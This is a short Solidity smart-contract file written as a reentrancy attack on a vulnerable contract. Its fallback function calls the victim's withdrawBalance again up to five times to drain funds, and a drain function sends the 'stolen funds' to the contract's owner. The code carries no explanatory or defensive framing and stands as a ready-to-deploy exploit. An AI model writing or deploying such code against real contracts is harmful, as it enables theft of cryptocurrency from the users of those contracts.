pragma solidity ^0.4.24;

interface IVictim {
    function withdrawBalance() external;
    function transfer(address to, uint amount) external;
}

contract ReentrancyAttack {
    IVictim public vulnerableContract;
    address public owner;
    uint public attackCount;

    constructor(address _victimAddress) public {
        vulnerableContract = IVictim(_victimAddress);
        owner = msg.sender;
    }

    // Fallback gets triggered during call
    function () external payable {
        if (attackCount < 5) {
            attackCount++;
            // Reenter withdraw to drain funds
            vulnerableContract.withdrawBalance();
        }
    }

    // Fund this contract first through a direct deposit or via the victim contract
    function attack() public payable {
        require(msg.sender == owner);

        // Assume attacker has some balance in the vulnerable contract
        vulnerableContract.withdrawBalance();
    }

    // Withdraw stolen funds
    function drain() public {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }
}

